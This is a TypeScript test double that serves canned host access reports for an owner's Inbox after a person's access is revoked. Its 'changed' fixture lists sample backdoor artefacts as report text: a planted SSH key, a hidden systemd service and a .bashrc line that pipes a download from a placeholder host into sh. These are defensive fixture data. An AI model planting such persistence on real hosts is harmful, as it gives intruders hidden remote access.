// SPDX-License-Identifier: AGPL-3.0-only
/**
 * The test double's access reports (`?accessleft=changed|clean|unchecked|all`, with `&accesslater=1` to have them arrive after the page opens): what the server would list in the owner's
 * Inbox after a person was revoked while their host stayed (D398). The sentences are the ones the server writes
 * (access_report_text.rs); this file only holds them in memory so the Inbox item can be seen and dismissed. Anyone but
 * the operator (the owner) is refused, as the server refuses them.
 */
import { AccessReportError, type AccessReportEntry, type AccessReportService } from "../access-left.on-demand";

/** The moment the reports were recorded, in Unix seconds. */
const NOW = 1_795_000_000;

/** A report that found new access: a key, a service and a startup line. */
const CHANGED: AccessReportEntry = {
  host_id: "6f1d0a52-7c3e-4b8a-9d21-0a5e4c7b1f30", host: "build-01", person_id: "0b2f6f4e-8d0a-4f43-9a8a-3f2f5f0c1a01", person_name: "Dana", recorded_at: NOW,
  outcome: "changed",
  headline: "These access files changed on the host since the person's logins were granted.",
  lines: [
    "Account deploy: changed since the grant.",
    "  Baseline from 14 Nov 2026, 09:12 UTC; checked at 21 Nov 2026, 10:05 UTC.",
    "  ~/.ssh/authorized_keys",
    "    + ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlanted00000000000000000000000000000000 dana@laptop",
    "  new: ~/.config/systemd/user/sync.service",
    "    + ExecStart=/tmp/.sync --quiet",
    "  ~/.bashrc",
    "    + curl -s https://example.invalid/x | sh",
    "Remove what you do not recognise. infraternal did not change these files.",
  ],
};

/** A report that checked everything and found nothing, with D364's root checks and D367's coverage boundary. */
const CLEAN: AccessReportEntry = {
  host_id: "a3b8c1d4-2e5f-4a6b-8c7d-9e0f1a2b3c4d", host: "web-02", person_id: "7c1d2e3f-4a5b-4c6d-8e7f-0a1b2c3d4e02", person_name: "Sam", recorded_at: NOW - 3600,
  outcome: "unchanged",
  headline: "No changes found in the 214 places we watch (SSH keys, cron and at jobs, user services, shell startup files) since 14 Nov 2026, 09:12 UTC. They had no root access through sudo, doas, polkit or admin groups. Access outside these checks isn't covered.",
  lines: [
    "Account deploy: No changes found in the 214 places we watch (SSH keys, cron and at jobs, user services, shell startup files) since 14 Nov 2026, 09:12 UTC. They had no root access through sudo, doas, polkit or admin groups. Access outside these checks isn't covered.",
  ],
};

/** A report that could not vouch for anything: the host runs infraternal as the account itself. */
const UNCHECKED: AccessReportEntry = {
  host_id: "d4c3b2a1-9f8e-4d7c-8b6a-5f4e3d2c1b03", host: "pi-garage", person_id: "9e8d7c6b-5a4f-4e3d-8c2b-1a0f9e8d7c03", person_name: "Alex", recorded_at: NOW - 7200,
  outcome: "not_checked",
  headline: "The host's access files were not fully checked; see why below.",
  lines: [
    "Account pi: not verified: infraternal runs as this account itself, so the person could have changed the record; anything below is only a hint, check by hand.",
  ],
};

/** The reports a scene shows: `changed`, `clean`, `unchecked`, or `all` (the three). */
export function mockAccessReports(scene: string, owner: boolean, later = false): AccessReportService {
  // `later`: the first answer is empty and the reports arrive with the second, as when a person is revoked while the
  // page is open (the toast, then the Inbox).
  let asked = 0;
  let waiting: AccessReportEntry[] = scene === "all" ? [CHANGED, CLEAN, UNCHECKED] : scene === "clean" ? [CLEAN] : scene === "unchecked" ? [UNCHECKED] : [CHANGED];
  return {
    list: async () => {
      if (!owner) throw new AccessReportError("Not the owner.", 403);
      asked += 1;
      if (later && asked === 1) return { reports: [], more: 0 };
      return { reports: waiting.map((entry) => ({ ...entry, lines: [...entry.lines] })), more: 0 };
    },
    dismiss: async (hostId, personId) => { waiting = waiting.filter((entry) => entry.host_id !== hostId || entry.person_id !== personId); },
  };
}
